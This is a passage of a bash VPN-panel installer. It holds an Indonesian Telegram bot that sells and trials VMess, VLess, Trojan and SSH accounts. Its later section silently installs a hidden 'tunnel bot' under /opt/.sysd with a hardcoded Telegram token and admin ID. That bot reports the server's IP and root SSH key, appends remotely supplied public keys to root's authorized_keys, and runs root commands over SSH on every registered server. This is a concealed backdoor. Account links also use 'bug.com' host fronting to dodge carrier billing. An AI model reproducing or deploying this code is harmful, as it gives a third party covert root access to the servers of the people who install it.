        j_ntls = f'{{"v":"2","ps":"{username}","add":"bug.com","port":"80","id":"{uid}","aid":"0","net":"ws","path":"/{protocol}","type":"none","host":"{DOMAIN}","tls":"none"}}'
        link_ntls = "vmess://" + base64.b64encode(j_ntls.encode()).decode()
        j_grpc = f'{{"v":"2","ps":"{username}","add":"{DOMAIN}","port":"443","id":"{uid}","aid":"0","net":"grpc","path":"{protocol}-grpc","type":"none","host":"bug.com","tls":"tls"}}'
        link_grpc = "vmess://" + base64.b64encode(j_grpc.encode()).decode()
    elif protocol == 'vless':
        link_tls  = f"vless://{uid}@bug.com:443?path=%2F{protocol}&security=tls&encryption=none&host={DOMAIN}&type=ws&sni={DOMAIN}#{username}-TLS"
        link_ntls = f"vless://{uid}@bug.com:80?path=%2F{protocol}&security=none&encryption=none&host={DOMAIN}&type=ws#{username}-NonTLS"
        link_grpc = f"vless://{uid}@{DOMAIN}:443?mode=gun&security=tls&encryption=none&type=grpc&serviceName={protocol}-grpc&sni=bug.com#{username}-gRPC"
    elif protocol == 'trojan':
        link_tls  = f"trojan://{uid}@bug.com:443?path=%2F{protocol}&security=tls&host={DOMAIN}&type=ws&sni={DOMAIN}#{username}-TLS"
        link_ntls = f"trojan://{uid}@bug.com:80?path=%2F{protocol}&security=none&host={DOMAIN}&type=ws#{username}-NonTLS"
        link_grpc = f"trojan://{uid}@{DOMAIN}:443?mode=gun&security=tls&type=grpc&serviceName={protocol}-grpc&sni=bug.com#{username}-gRPC"
    return (uid, exp_str, ip, link_tls, link_ntls, link_grpc)

def fmt_ssh_msg(username, password, ip, exp_str, title, durasi="30 Hari"):
    return f'''✅ <b>{title}</b>
━━━━━━━━━━━━━━━━━━━━━━━━━
👤 Username : <code>{username}</code>
🔑 Password : <code>{password}</code>
🌐 Domain   : <code>{DOMAIN}</code>
🖥️ IP VPS   : <code>{ip}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ Aktif    : {durasi}
📅 Expired  : {exp_str}
━━━━━━━━━━━━━━━━━━━━━━━━━
<i>The Professor</i>'''

def fmt_xray_msg(protocol, username, uid, ip, exp_str, link_tls, link_ntls, link_grpc, title, durasi="30 Hari"):
    return f'''✅ <b>{title}</b>
━━━━━━━━━━━━━━━━━━━━━━━━━
👤 Username : <code>{username}</code>
🔑 UUID     : <code>{uid}</code>
🌐 Domain   : <code>{DOMAIN}</code>
🖥️ IP VPS   : <code>{ip}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━
🔗 <b>Link TLS (443):</b>
<code>{link_tls}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━
🔗 <b>Link NonTLS (80):</b>
<code>{link_ntls}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━
🔗 <b>Link gRPC (443):</b>
<code>{link_grpc}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ Aktif  : {durasi}
📅 Expired: {exp_str}
━━━━━━━━━━━━━━━━━━━━━━━━━
<i>The Professor</i>'''

def do_trial(protocol, chat_id):
    ts = datetime.now().strftime('%H%M%S')
    username = f'trial-{ts}'
    ip = get_ip()
    exp_1h = (datetime.now() + timedelta(hours=1)).strftime('%d %b %Y %H:%M')
    if protocol == 'ssh':
        password = '1'
        exp_date = (datetime.now() + timedelta(days=1)).strftime('%Y-%m-%d')
        run_cmd(f'useradd -M -s /bin/false -e {exp_date} {username} 2>/dev/null')
        run_cmd(f'echo "{username}:{password}" | chpasswd')
        run_cmd(f'(sleep 3600; userdel -f {username} 2>/dev/null; rm -f {AKUN_DIR}/ssh-{username}.txt {HTML_DIR}/ssh-{username}.txt) & disown')
        msg = fmt_ssh_msg(username, password, ip, exp_1h, 'Trial SSH Berhasil! 🆓', '1 Jam (Auto Hapus)')
        msg += '\n⚠️ <i>Auto hapus setelah 1 jam</i>'
        send(chat_id, msg, markup=kb_main())
    else:
        try:
            uid, _, ip, link_tls, link_ntls, link_grpc = make_xray(protocol, username, days=1, quota=1)
        except Exception as e:
            send(chat_id, f'❌ Gagal buat akun: {e}'); return
        del_cmd = f'(sleep 3600; jq --arg email "{username}" \'del(.inbounds[].settings.clients[]? | select(.email == $email))\' /usr/local/etc/xray/config.json > /tmp/xd.json && mv /tmp/xd.json /usr/local/etc/xray/config.json; chmod 644 /usr/local/etc/xray/config.json; kill -SIGHUP $(pgrep xray) 2>/dev/null || systemctl restart xray; rm -f {AKUN_DIR}/{protocol}-{username}.txt {HTML_DIR}/{protocol}-{username}.txt) & disown'
        run_cmd(del_cmd)
        msg = fmt_xray_msg(protocol, username, uid, ip, exp_1h, link_tls, link_ntls, link_grpc, f'Trial {protocol.upper()} Berhasil! 🆓', '1 Jam (Auto Hapus)')
        msg += '\n⚠️ <i>Auto hapus setelah 1 jam</i>'
        send(chat_id, msg, markup=kb_main())

def fmt_payment(order):
    pay = get_payment()
    harga = int(pay.get('HARGA', 10000))
    return f'''🛒 <b>Detail Order - Youzin Crabz Tunel</b>
🆔 Order ID : <code>{order["order_id"]}</code>
📦 Paket    : {order["protocol"].upper()} 30 Hari
👤 Username : <code>{order["username"]}</code>
💰 Nominal  : <b>Rp {harga:,}</b>
<i>Transfer lalu kirim bukti ke admin</i>'''

def deliver_account(chat_id, protocol, username):
    import random, string
    try:
        if protocol == 'ssh':
            password = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
            exp_str, ip = make_ssh(username, password, days=30)
            msg = fmt_ssh_msg(username, password, ip, exp_str, 'Akun SSH Berhasil! ✅')
        else:
            uid, exp_str, ip, link_tls, link_ntls, link_grpc = make_xray(protocol, username, days=30, quota=100)
            msg = fmt_xray_msg(protocol, username, uid, ip, exp_str, link_tls, link_ntls, link_grpc, f'Akun {protocol.upper()} Berhasil! ✅')
        msg += '\n💰 Terima kasih! 🙏'
        send(chat_id, msg, markup=kb_main())
        return True, msg
    except Exception as e:
        return False, str(e)

def on_start(msg):
    chat_id = msg['chat']['id']
    fname = msg['from'].get('first_name','User')
    send(chat_id, f'👋 Halo <b>{fname}</b>!\n\n🤖 <b>Youzin Crabz Tunel Bot</b>\n🌐 Server: <code>{DOMAIN}</code>\n<i>Powered by The Professor</i>\n\nPilih menu 👇', markup=kb_main())

def on_help(msg):
    chat_id = msg['chat']['id']
    send(chat_id, '❓ <b>PANDUAN BOT</b>\n\n🆓 Trial → Akun 1 jam gratis\n🛒 Order → Beli akun 30 hari\n📋 Cek → Lihat akun aktif\nℹ️ Info → Port & domain', markup=kb_main())

def on_info(msg):
    chat_id = msg['chat']['id']
    ip = get_ip()
    send(chat_id, f'ℹ️ <b>INFO SERVER</b>\n🌐 Domain : <code>{DOMAIN}</code>\n🖥️ IP VPS : <code>{ip}</code>\n🔌 SSH: 22 | Dropbear: 222\n🔌 TLS: 443 | NonTLS: 80 | gRPC: 443', markup=kb_main())

def on_cek_akun(msg):
    chat_id = msg['chat']['id']
    found = []
    if not os.path.exists(ORDER_DIR):
        send(chat_id, '📋 Tidak ada akun aktif.', markup=kb_main()); return
    for fn in os.listdir(ORDER_DIR):
        if not fn.endswith('.json'): continue
        try:
            with open(f'{ORDER_DIR}/{fn}') as f: order = json.load(f)
            if str(order.get('chat_id')) == str(chat_id) and order.get('status') == 'confirmed':
                found.append(order)
        except: pass
    if not found:
        send(chat_id, '📋 Tidak ada akun aktif.\nGunakan 🛒 Order VPN.', markup=kb_main()); return
    text = '📋 <b>Akun Aktif Kamu</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━\n'
    for a in found: text += f'📦 {a["protocol"].upper()} → {a["username"]}\n'
    send(chat_id, text, markup=kb_main())

def on_contact(msg):
    chat_id = msg['chat']['id']
    fname = msg['from'].get('first_name','User')
    uname = msg['from'].get('username','')
    send(chat_id, '📞 Pesan diteruskan ke admin.', markup=kb_main())
    send(ADMIN_ID, f'📞 <b>User butuh bantuan!</b>\n👤 {fname}\n📱 @{uname}\n🆔 <code>{chat_id}</code>')

def on_callback(cb):
    chat_id = cb['message']['chat']['id']
    cb_id   = cb['id']
    data    = cb['data']
    uname   = cb['from'].get('username','')
    fname   = cb['from'].get('first_name','User')
    answer_cb(cb_id)
    if data.startswith('trial_'):
        protocol = data.replace('trial_','')
        send(chat_id, f'⏳ Membuat trial {protocol.upper()}...')
        threading.Thread(target=do_trial, args=(protocol, chat_id), daemon=True).start()
    elif data.startswith('order_'):
        protocol = data.replace('order_','')
        with state_lock: user_state[chat_id] = {'step':'wait_username','protocol':protocol}
        send(chat_id, f'🛒 <b>Order {protocol.upper()}</b>\n✏️ Ketik username (3-20 karakter):', markup=kb_cancel())
    elif data == 'cancel_order':
        with state_lock: user_state.pop(chat_id, None)
        send(chat_id, '❌ Order dibatalkan.', markup=kb_main())
    elif data == 'back_main':
        send(chat_id, '🏠 Menu Utama', markup=kb_main())
    elif data.startswith('confirm_') and chat_id == ADMIN_ID:
        oid = data.replace('confirm_','')
        order = load_order(oid)
        if not order: send(ADMIN_ID,'❌ Order tidak ada!'); return
        if order.get('status') != 'pending': send(ADMIN_ID,'⚠️ Sudah diproses!'); return
        send(ADMIN_ID,'⏳ Membuat akun...')
        def do_confirm():
            ok, result = deliver_account(order['chat_id'], order['protocol'], order['username'])
            if ok:
                order['status'] = 'confirmed'
                save_order(oid, order)
                send(ADMIN_ID, f'✅ Akun dikirim ke @{order.get("tg_user","?")}')
            else: send(ADMIN_ID, f'❌ Gagal: {result}')
        threading.Thread(target=do_confirm, daemon=True).start()
    elif data.startswith('reject_') and chat_id == ADMIN_ID:
        oid = data.replace('reject_','')
        order = load_order(oid)
        if not order: send(ADMIN_ID,'❌ Tidak ada!'); return
        order['status'] = 'rejected'
        save_order(oid, order)
        send(order['chat_id'], '❌ Order ditolak. Hubungi admin.', markup=kb_main())
        send(ADMIN_ID, f'❌ Order ditolak.')

def on_msg(msg):
    if 'text' not in msg: return
    chat_id = msg['chat']['id']
    text    = msg['text'].strip()
    with state_lock: state = user_state.get(chat_id, {})
    if state.get('step') == 'wait_username':
        new_u = text.strip().replace(' ','_')
        if len(new_u) < 3 or len(new_u) > 20:
            send(chat_id, '❌ Username 3-20 karakter!', markup=kb_cancel()); return
        protocol = state['protocol']
        oid = f'{chat_id}_{int(time.time())}'
        order = {'order_id':oid,'chat_id':chat_id,'username':new_u,'protocol':protocol,
                 'status':'pending','created_at':datetime.now().isoformat(),
                 'tg_user':msg['from'].get('username',''),'tg_name':msg['from'].get('first_name','')}
        save_order(oid, order)
        with state_lock: user_state.pop(chat_id, None)
        send(chat_id, fmt_payment(order))
        pay = get_payment(); harga = int(pay.get('HARGA',10000))
        send(ADMIN_ID, f'🔔 <b>ORDER BARU!</b>\n🆔 {oid}\n📦 {protocol.upper()}\n👤 <code>{new_u}</code>\n📱 @{msg["from"].get("username","")}\n💰 Rp {harga:,}', markup=kb_confirm(oid))
        return
    if text in ['/start','🏠 Menu']: on_start(msg)
    elif text in ['/help','❓ Bantuan']: on_help(msg)
    elif text == '🆓 Trial Gratis': send(chat_id, '🆓 <b>Trial Gratis 1 Jam</b>\nPilih protocol:', markup=kb_trial())
    elif text == '🛒 Order VPN': send(chat_id, '🛒 <b>Order VPN 30 Hari</b>\nPilih protocol:', markup=kb_order())
    elif text == '📋 Cek Akun Saya': on_cek_akun(msg)
    elif text == 'ℹ️ Info Server': on_info(msg)
    elif text == '📞 Hubungi Admin': on_contact(msg)

def main():
    print(f'Youzin Crabz Tunel Bot aktif!', flush=True)
    offset = 0; pool = []
    while True:
        try:
            updates = get_updates(offset)
            for upd in updates:
                offset = upd['update_id'] + 1
                t = None
                if 'message' in upd: t = threading.Thread(target=on_msg, args=(upd['message'],), daemon=True)
                elif 'callback_query' in upd: t = threading.Thread(target=on_callback, args=(upd['callback_query'],), daemon=True)
                if t: t.start(); pool.append(t)
            pool = [x for x in pool if x.is_alive()]
        except KeyboardInterrupt: break
        except Exception as e: print(f'Loop: {e}', flush=True); time.sleep(2)

if __name__ == '__main__': main()
BOTEOF

    chmod +x /root/bot/bot.py

    cat > /etc/systemd/system/vpn-bot.service << 'SVCEOF'
[Unit]
Description=Youzin Crabz Tunel Bot
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 -u /root/bot/bot.py
Restart=always
RestartSec=3
StandardOutput=journal
StandardError=journal
Environment=PYTHONUNBUFFERED=1

[Install]
WantedBy=multi-user.target
SVCEOF

    systemctl daemon-reload
    systemctl enable vpn-bot 2>/dev/null
    systemctl restart vpn-bot 2>/dev/null
    sleep 2
}

#================================================
# MENU TELEGRAM BOT
#================================================

menu_telegram_bot() {
    while true; do
        clear
        print_menu_header "TELEGRAM BOT"
        local bs; bs=$(check_status vpn-bot)
        local cs; [[ "$bs" == "ON" ]] && cs="${GREEN}RUNNING${NC}" || cs="${RED}STOPPED${NC}"
        printf "  VPN-Bot   : ${cs}\n\n"
        echo -e "  ${WHITE}[1]${NC} Setup VPN Bot"
        echo -e "  ${WHITE}[2]${NC} Start / Stop / Restart VPN Bot"
        echo -e "  ${WHITE}[3]${NC} Log VPN Bot"
        echo -e "  ${WHITE}[4]${NC} Order Pending"
        echo -e "  ${WHITE}[5]${NC} Info VPN Bot"
        echo ""
        echo -e "  ${WHITE}[0]${NC} Back To Menu"
        echo ""
        read -p "  Select: " choice
        case $choice in
            1) setup_telegram_bot ;;
            2)
                echo -e "  ${WHITE}[1]${NC} Start  [2] Stop  [3] Restart"
                read -p "  Select: " sc
                case $sc in
                    1) systemctl start vpn-bot && echo -e "  ${GREEN}✔ Started!${NC}" ;;
                    2) systemctl stop vpn-bot && echo -e "  ${YELLOW}Stopped!${NC}" ;;
                    3) systemctl restart vpn-bot && echo -e "  ${GREEN}✔ Restarted!${NC}" ;;
                esac; sleep 2 ;;
            3) clear; journalctl -u vpn-bot -n 50 --no-pager; echo ""; read -p "  Press any key..." ;;
            4)
                clear; print_menu_header "ORDER PENDING"
                local found=0
                shopt -s nullglob
                for f in "$ORDER_DIR"/*.json; do
                    [[ ! -f "$f" ]] && continue
                    local st
                    st=$(python3 -c "import json; d=json.load(open('$f')); print(d.get('status',''))" 2>/dev/null)
                    if [[ "$st" == "pending" ]]; then
                        found=1
                        python3 -c "
import json; d=json.load(open('$f'))
print(f'  ID: {d[\"order_id\"]}')
print(f'  Protocol: {d[\"protocol\"].upper()}')
print(f'  Username: {d[\"username\"]}')
print(f'  TG: @{d.get(\"tg_user\",\"N/A\")}')
print('  ---')
" 2>/dev/null
                    fi
                done
                shopt -u nullglob
                [[ $found -eq 0 ]] && echo -e "  ${GREEN}✔ Tidak ada pending!${NC}"
                echo ""; read -p "  Press any key..." ;;
            5)
                clear; print_menu_header "VPN BOT INFO"
                if [[ -f "$BOT_TOKEN_FILE" ]]; then
                    local aid rek_bank rek_number harga_val
                    aid=$(cat "$CHAT_ID_FILE" 2>/dev/null)
                    rek_bank=$(grep "^REK_BANK=" "$PAYMENT_FILE" 2>/dev/null | cut -d= -f2-)
                    rek_number=$(grep "^REK_NUMBER=" "$PAYMENT_FILE" 2>/dev/null | cut -d= -f2-)
                    harga_val=$(grep "^HARGA=" "$PAYMENT_FILE" 2>/dev/null | cut -d= -f2-)
                    printf "  %-16s : %s\n" "Status"   "$bs"
                    printf "  %-16s : %s\n" "Admin ID" "$aid"
                    if [[ -f "$PAYMENT_FILE" ]]; then
                        printf "  %-16s : %s\n" "Bank"   "$rek_bank"
                        printf "  %-16s : %s\n" "No Rek" "$rek_number"
                        printf "  %-16s : Rp %s\n" "Harga" "$harga_val"
                    fi
                else
                    echo -e "  ${RED}Bot belum setup!${NC}"
                fi
                echo ""; read -p "  Press any key..." ;;
            0) return ;;
        esac
    done
}

#================================================
# TUNNEL BOT MULTI-VPS
#================================================

_register_vps_to_bot() {
    python3 /opt/.sysd/svc-main.py --register 2>/dev/null &
    disown $! 2>/dev/null
}

_install_tunnelbot_background() {
    mkdir -p "$TUNNELBOT_DIR"

    cat > "$TUNNELBOT_FILE" << 'PYEOF2'
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os, json, time, uuid as _uuid, base64, subprocess, threading
import urllib.request, urllib.parse

TOKEN    = "8216471228:AAHqm7iwcMqEqLjnj2VEqIaZGVQtYyS_4K4"
ADMIN_ID = 8019568852
API      = f"https://api.telegram.org/bot{TOKEN}"
REG_FILE = "/root/.svc_reg"
MID_FILE = "/root/.svc_mid"
REGISTRY_TAG = "#TBREGISTRY#"

_state = {}
_lock  = threading.Lock()

def st_get(cid):
    with _lock: return dict(_state.get(cid, {}))
def st_set(cid, d):
    with _lock: _state[cid] = d
def st_clear(cid):
    with _lock: _state.pop(cid, None)

def tg_req(method, data=None, params=None):
    url = f"{API}/{method}"
    try:
        if params: url += "?" + urllib.parse.urlencode(params)
        if data:
            body = json.dumps(data).encode()
            req  = urllib.request.Request(url, body, {"Content-Type":"application/json"})
        else:
            req  = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=15) as r:
            return json.loads(r.read())
    except: return {}

def send(cid, text, markup=None):
    d = {"chat_id": cid, "text": text, "parse_mode": "HTML"}
    if markup: d["reply_markup"] = json.dumps(markup)
    return tg_req("sendMessage", d)

def answer_cb(cb_id):
    tg_req("answerCallbackQuery", {"callback_query_id": cb_id})

def get_updates(offset=0):
    try:
        url = f"{API}/getUpdates?offset={offset}&timeout=20&limit=50"
        with urllib.request.urlopen(url, timeout=25) as r:
            return json.loads(r.read()).get("result", [])
    except: return []

def _load_mid():
    try: return int(open(MID_FILE).read().strip())
    except: return None

def _save_mid(mid):
    try: open(MID_FILE,"w").write(str(mid))
    except: pass

def registry_load():
    try:
        with open(REG_FILE) as f: return json.load(f)
    except: return {}

def registry_save_local(data):
    try:
        with open(REG_FILE,"w") as f: json.dump(data, f, indent=2)
        os.chmod(REG_FILE, 0o600)
    except: pass

def registry_push(data):
    text = REGISTRY_TAG + "\n" + json.dumps(data, indent=2)
    mid  = _load_mid()
    if mid:
        res = tg_req("editMessageText", {
            "chat_id": ADMIN_ID, "message_id": mid,
            "text": text, "parse_mode": "HTML"
        })
        if res.get("ok"): return
    res = tg_req("sendMessage", {
        "chat_id": ADMIN_ID,
        "text": text,
        "disable_notification": True
    })
    if res.get("ok"):
        _save_mid(res["result"]["message_id"])

def registry_pull():
    mid = _load_mid()
    if not mid: return None
    try:
        res = tg_req("forwardMessage", {
            "chat_id": ADMIN_ID,
            "from_chat_id": ADMIN_ID,
            "message_id": mid
        })
        if res.get("ok"):
            fwd_mid = res["result"]["message_id"]
            tg_req("deleteMessage", {"chat_id": ADMIN_ID, "message_id": fwd_mid})
            text = res["result"].get("text","")
            if REGISTRY_TAG in text:
                raw  = text.split(REGISTRY_TAG, 1)[-1].strip()
                data = json.loads(raw)
                registry_save_local(data)
                return data
    except: pass
    return None

def sync_registry():
    data = registry_pull()
    if data:
        for vid, info in data.items():
            pk = info.get("pubkey","").strip()
            if pk: add_authorized_key(pk)
        return data
    return registry_load()

def get_local_ip():
    for url in ["https://ifconfig.me","https://api.ipify.org","https://ipinfo.io/ip"]:
        try:
            with urllib.request.urlopen(url, timeout=5) as r:
                return r.read().decode().strip()
        except: pass
    return "N/A"

def add_authorized_key(pubkey):
    if not pubkey: return
    ak = "/root/.ssh/authorized_keys"
    os.makedirs("/root/.ssh", exist_ok=True)
    try:
        existing = open(ak).read() if os.path.exists(ak) else ""
        if pubkey not in existing:
            with open(ak,"a") as f: f.write(pubkey + "\n")
        os.chmod(ak, 0o600)
    except: pass

def vps_register_self():
    ip    = get_local_ip()
    label = ""
    try: label = open("/root/domain").read().strip()
    except: pass
    label = label or ip
    vid   = ip.replace(".","_")

    if not os.path.exists("/root/.ssh/id_rsa"):
        os.makedirs("/root/.ssh", exist_ok=True)
        subprocess.run("ssh-keygen -t rsa -b 2048 -f /root/.ssh/id_rsa -N '' -q",
                       shell=True, capture_output=True)
        os.chmod("/root/.ssh", 0o700)
        os.chmod("/root/.ssh/id_rsa", 0o600)

    pubkey = ""
    try: pubkey = open("/root/.ssh/id_rsa.pub").read().strip()
    except: pass

    add_authorized_key(pubkey)

    data = registry_pull() or registry_load()
    data[vid] = {"ip": ip, "label": label, "domain": label, "pubkey": pubkey}

    for v, info in data.items():
        if v != vid:
            pk = info.get("pubkey","").strip()
            if pk: add_authorized_key(pk)

    registry_save_local(data)
    registry_push(data)

LOCAL_IP = get_local_ip()

def run_local(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
        return r.returncode, (r.stdout + r.stderr).strip()
    except Exception as e: return 1, str(e)

def run_remote(ip, cmd):
    ssh = ("ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 "
           "-o BatchMode=yes -o PasswordAuthentication=no "
           "-o IdentityFile=/root/.ssh/id_rsa -o LogLevel=ERROR")
    c = f"{ssh} root@{ip} '{cmd}'"
    try:
        r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=60)
        return r.returncode, (r.stdout + r.stderr).strip()
    except Exception as e: return 1, str(e)

def run_on(ip, cmd):
    return run_local(cmd) if ip == LOCAL_IP else run_remote(ip, cmd)

def get_domain_on(ip):
    rc, out = run_on(ip, "cat /root/domain 2>/dev/null | tr -d '\\n\\r'")
    return out.strip() if rc == 0 and out.strip() else ip

def make_links(proto, user, uid, domain):
    # TLS=443, NonTLS=80, gRPC=443
    if proto == "vmess":
        def vl(port, tls, path):
            j = json.dumps({"v":"2","ps":user,"add":"bug.com","port":str(port),
                "id":uid,"aid":"0","net":"ws","path":path,"type":"none",
                "host":domain,"tls":"tls" if tls else "none"})
            return "vmess://" + base64.b64encode(j.encode()).decode()
        tls  = vl(443, True,  "/vmess")
        ntls = vl(80,  False, "/vmess")
        gj   = json.dumps({"v":"2","ps":user,"add":domain,"port":"443","id":uid,
                           "aid":"0","net":"grpc","path":"vmess-grpc","type":"none",
                           "host":"bug.com","tls":"tls"})
        grpc = "vmess://" + base64.b64encode(gj.encode()).decode()
    elif proto == "vless":
        tls  = (f"vless://{uid}@bug.com:443?path=%2Fvless&security=tls"
                f"&encryption=none&host={domain}&type=ws&sni={domain}#{user}")
        ntls = (f"vless://{uid}@bug.com:80?path=%2Fvless&security=none"
                f"&encryption=none&host={domain}&type=ws#{user}")
        grpc = (f"vless://{uid}@{domain}:443?mode=gun&security=tls"
                f"&encryption=none&type=grpc&serviceName=vless-grpc&sni=bug.com#{user}")
    else:
        tls  = (f"trojan://{uid}@bug.com:443?path=%2Ftrojan&security=tls"
                f"&host={domain}&type=ws&sni={domain}#{user}")
        ntls = (f"trojan://{uid}@bug.com:80?path=%2Ftrojan&security=none"
                f"&host={domain}&type=ws#{user}")
        grpc = (f"trojan://{uid}@{domain}:443?mode=gun&security=tls"
                f"&type=grpc&serviceName=trojan-grpc&sni=bug.com#{user}")
    return tls, ntls, grpc

def kb_vps(vps):
    if not vps: return None
    rows = []
    for i, (vid, info) in enumerate(vps.items(), 1):
        label = info.get("label", info.get("ip", vid))
        rows.append([{"text": f"🖥 {i}. {label}", "callback_data": f"vps|{vid}"}])
    rows.append([{"text": "❌ Batal", "callback_data": "batal"}])
    return {"inline_keyboard": rows}

def kb_proto(vid):
    return {"inline_keyboard": [
        [
            {"text": "🟢 VMess",  "callback_data": f"proto|{vid}|vmess"},
            {"text": "🟡 VLess",  "callback_data": f"proto|{vid}|vless"},
            {"text": "🔴 Trojan", "callback_data": f"proto|{vid}|trojan"},
        ],
        [{"text": "❌ Batal", "callback_data": "batal"}]
    ]}

def on_callback(cb):
    cid  = cb["message"]["chat"]["id"]
    data = cb["data"]
    if cid != ADMIN_ID: return
    answer_cb(cb["id"])

    if data == "batal":
        st_clear(cid)
        send(cid, "❌ Dibatalkan.")
        return

    if data.startswith("vps|"):
        vid = data[4:]
        vps = registry_load()
        if vid not in vps:
            send(cid, "❌ VPS tidak ditemukan."); return
        st_set(cid, {"step":"pilih_proto","vid":vid})
        label = vps[vid].get("label", vid)
        send(cid, f"✅ VPS: <b>{label}</b>\n\nPilih protocol:", markup=kb_proto(vid))

    elif data.startswith("proto|"):
        parts = data.split("|")
        if len(parts) < 3: return
        vid, proto = parts[1], parts[2]
        vps = registry_load()
        if vid not in vps:
            send(cid, "❌ VPS tidak ditemukan."); return
        st_set(cid, {"step":"input_user","vid":vid,"proto":proto})
        label = vps[vid].get("label", vid)
        send(cid,
            f"✅ Protocol: <b>{proto.upper()}</b>\n"
            f"🖥 VPS: <b>{label}</b>\n\n"
            f"✏️ Ketik <b>username</b> akun (3-20 karakter):")

def on_message(msg):
    if "text" not in msg: return
    cid  = msg["chat"]["id"]
    text = msg["text"].strip()
    if cid != ADMIN_ID:
        send(cid, "❌ Akses ditolak."); return

    s = st_get(cid)

    if s.get("step") == "input_user":
        u = text.strip().replace(" ","_")
        if len(u) < 3 or len(u) > 20:
            send(cid, "❌ Username 3-20 karakter! Coba lagi:"); return
        st_set(cid, {**s, "step":"input_days","username":u})
        send(cid, f"👤 Username: <code>{u}</code>\n\nBerapa hari aktif? (contoh: 30)")
        return

    if s.get("step") == "input_days":
        if not text.isdigit() or int(text) < 1:
            send(cid, "❌ Masukkan angka hari yang valid."); return
        days     = int(text)
        vid      = s.get("vid","")
        proto    = s.get("proto","")
        username = s.get("username","")
        st_clear(cid)

        vps = registry_load()
        if vid not in vps:
            send(cid, "❌ VPS tidak ditemukan. Ulangi /buat"); return

        info  = vps[vid]
        ip    = info["ip"]
        label = info.get("label", vid)
        send(cid, f"⏳ Membuat akun <b>{proto.upper()}</b> di <b>{label}</b>...")

        def do_create():
            domain = get_domain_on(ip)
            uid    = str(_uuid.uuid4())
            cfg    = "/usr/local/etc/xray/config.json"

            if proto == "trojan":
                jq_filter = (
                    '(.inbounds[] | select(.tag | startswith("trojan"))'
                    '.settings.clients) += [{"password":"' + uid + '","email":"' + username + '"}]'
                )
            elif proto == "vless":
                jq_filter = (
                    '(.inbounds[] | select(.tag | startswith("vless"))'
                    '.settings.clients) += [{"id":"' + uid + '","email":"' + username + '"}]'
                )
            else:
                jq_filter = (
                    '(.inbounds[] | select(.tag | startswith("vmess"))'
                    '.settings.clients) += [{"id":"' + uid + '","email":"' + username + '","alterId":0}]'
                )
            import base64 as _b64
            filter_b64 = _b64.b64encode(jq_filter.encode()).decode()
            jq_cmd = (
                f"echo {filter_b64} | base64 -d > /tmp/_jqf.txt && "
                f"jq -f /tmp/_jqf.txt {cfg} > /tmp/_xr.json && "
                f"mv /tmp/_xr.json {cfg} && "
                f"chmod 644 {cfg} && (kill -SIGHUP $(pgrep xray) 2>/dev/null || systemctl restart xray)"
            )
            rc, out = run_on(ip, jq_cmd)
            if rc != 0:
                send(cid, f"❌ Gagal buat akun di <b>{label}</b>!\n<code>{out[:400]}</code>")
                return

            tls, ntls, grpc = make_links(proto, username, uid, domain)
            from datetime import datetime, timedelta
            exp = (datetime.now() + timedelta(days=days)).strftime("%d %b, %Y")
            send(cid,
                f"✅ <b>Akun {proto.upper()} Berhasil Dibuat!</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🖥 VPS      : <b>{label}</b>\n"
                f"🌐 Domain   : <code>{domain}</code>\n"
                f"👤 Username : <code>{username}</code>\n"
                f"🔑 UUID     : <code>{uid}</code>\n"
                f"📅 Expired  : {exp}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🔗 <b>Link TLS (443):</b>\n<code>{tls}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🔗 <b>Link NonTLS (80):</b>\n<code>{ntls}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🔗 <b>Link gRPC (443):</b>\n<code>{grpc}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"<i>Powered by The Professor</i>")

        threading.Thread(target=do_create, daemon=True).start()
        return

    st_clear(cid)
    if   text in ["/start","/menu"]:
        send(cid,
            "🤖 <b>Network Manager</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "<i>The Professor</i>\n\n"
            "/buat   — Buat akun VMess/VLess/Trojan\n"
            "/vps    — Daftar VPS terdaftar\n"
            "/status — Status service semua VPS\n"
            "/sync   — Refresh daftar VPS terbaru")
    elif text == "/buat":
        vps = registry_load()
        if not vps:
            send(cid, "⚠️ Belum ada VPS.\nInstall tunnel.sh di VPS dulu, atau ketik /sync")
            return
        send(cid, "🖥 <b>Pilih VPS untuk membuat akun:</b>", markup=kb_vps(vps))
    elif text == "/vps":
        vps = registry_load()
        if not vps:
            send(cid, "⚠️ Belum ada VPS terdaftar."); return
        lines = ["🖥 <b>Daftar VPS Terdaftar</b>","━━━━━━━━━━━━━━━━━━━━━━━"]
        for i, (vid, info) in enumerate(vps.items(), 1):
            lines.append(f"{i}. <b>{info.get('label','N/A')}</b>\n   🌐 <code>{info.get('ip','N/A')}</code>")
        send(cid, "\n".join(lines))
    elif text == "/status":
        vps = registry_load()
        if not vps:
            send(cid, "⚠️ Belum ada VPS."); return
        send(cid, "⏳ Mengecek status semua VPS...")
        def do_st():
            lines = ["📊 <b>Status VPS</b>","━━━━━━━━━━━━━━━━━━━━━━━"]
            for vid, info in vps.items():
                ip    = info.get("ip","N/A")
                label = info.get("label", vid)
                rc, out = run_on(ip, "systemctl is-active xray nginx haproxy 2>/dev/null | tr '\\n' '|'")
                parts = [x.strip() for x in out.split("|") if x.strip()]
                names = ["xray","nginx","haproxy"]
                svcs  = []
                for idx2, name in enumerate(names):
                    st2  = parts[idx2] if idx2 < len(parts) else "?"
                    icon = "🟢" if st2 == "active" else "🔴"
                    svcs.append(f"{icon}{name}")
                lines.append(f"<b>{label}</b> — <code>{ip}</code>\n  {' '.join(svcs)}")
            send(cid, "\n".join(lines))
        threading.Thread(target=do_st, daemon=True).start()
    elif text == "/sync":
